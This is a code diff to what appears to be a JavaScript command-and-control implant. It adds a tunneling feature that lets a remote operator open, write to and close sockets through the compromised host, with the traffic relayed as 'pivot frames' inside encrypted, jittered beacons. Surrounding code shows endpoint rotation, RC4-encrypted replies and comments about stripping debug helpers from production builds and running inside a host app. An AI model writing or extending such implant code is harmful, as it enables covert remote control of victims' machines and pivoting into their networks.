@@ -119,6 +119,23 @@ function handleTask(commandId, r, cfg, info, state) {
   const fsReply = fsops.dispatch(commandId, r, cfg, state, OutPacker);
   if (fsReply !== undefined) return fsReply ? { reply: fsReply } : null;
 
+  // tunnel channel (ticket 015): no task reply — frames ride the output stream
+  if (state.tunnels) {
+    if (commandId === CP.TUNNEL_START) {
+      const id = r.u32(); const type = r.u32(); const addr = r.str(); const port = r.u32(); r.u32(); // trailing taskId
+      state.tunnels.handleStart(id, type, addr, port);
+      return null;
+    }
+    if (commandId === CP.TUNNEL_WRITE) {
+      const id = r.u32(); const len = r.u32(); const data = r.take(len); r.u32();
+      state.tunnels.handleWrite(id, data);
+      return null;
+    }
+    if (commandId === CP.TUNNEL_CLOSE) { const id = r.u32(); r.u32(); state.tunnels.handleClose(id); return null; }
+    if (commandId === CP.TUNNEL_PAUSE) { const id = r.u32(); r.u32(); state.tunnels.handlePause(id); return null; }
+    if (commandId === CP.TUNNEL_RESUME) { const id = r.u32(); r.u32(); state.tunnels.handleResume(id); return null; }
+  }
+
   if (NO_ARG_ACK.has(commandId)) {
     const taskId = r.u32();
     return { reply: out.u32(taskId).u32(commandId).str('lw: command not implemented') };
@@ -167,6 +184,9 @@ async function run() {
 
   const maxCycles = process.env.LOIS_MAX_CYCLES ? parseInt(process.env.LOIS_MAX_CYCLES, 10) : Infinity;
   const state = fsops.createState();
+  const tunnelsMod = require('./tunnel');
+  tunnelsMod.setLogger(typeof log === 'function' ? log : null); // hygiene strips the helper in prod builds
+  state.tunnels = new tunnelsMod.Tunnels();
   let cycles = 0, terminate = false, pendingReply = null;
 
   for (;;) {
@@ -206,6 +226,7 @@ async function run() {
             log(`[-] task parse error: ${e.message}`);
           }
           fsops.processDownloads(state, outputs, cfg);
+          if (state.tunnels) state.tunnels.flush(outputs); // pivot frames ride every beat (015)
           if (outputs.parts.length) {
             const built = outputs.build();
             if (cfg.debug) {
@@ -219,12 +240,13 @@ async function run() {
         } else {
           const outputs = new OutPacker();
           fsops.processDownloads(state, outputs, cfg);
+          if (state.tunnels) state.tunnels.flush(outputs);
           if (outputs.parts.length) pendingReply = rc4(outputs.build(), sessionKey);
           log('[+] tick (no tasks)');
         }
       }
     } catch (err) {
-      if (cfg.endpoints.length > 1) rotateEndpoint(cfg, log);
+      if (cfg.endpoints.length > 1) rotateEndpoint(cfg, typeof log === 'function' ? log : () => {});
       log(`[-] callback error: ${err.message}`);
     }
 
@@ -238,6 +260,7 @@ async function run() {
     }
     await new Promise((r) => setTimeout(r, jittered(cfg)));
   }
+  state.tunnels.destroyAll(); // never leave sockets pinned to the host app (015)
 }
 
 if (require.main === module) run().catch((e) => { console.error('fatal', e); process.exit(1); });
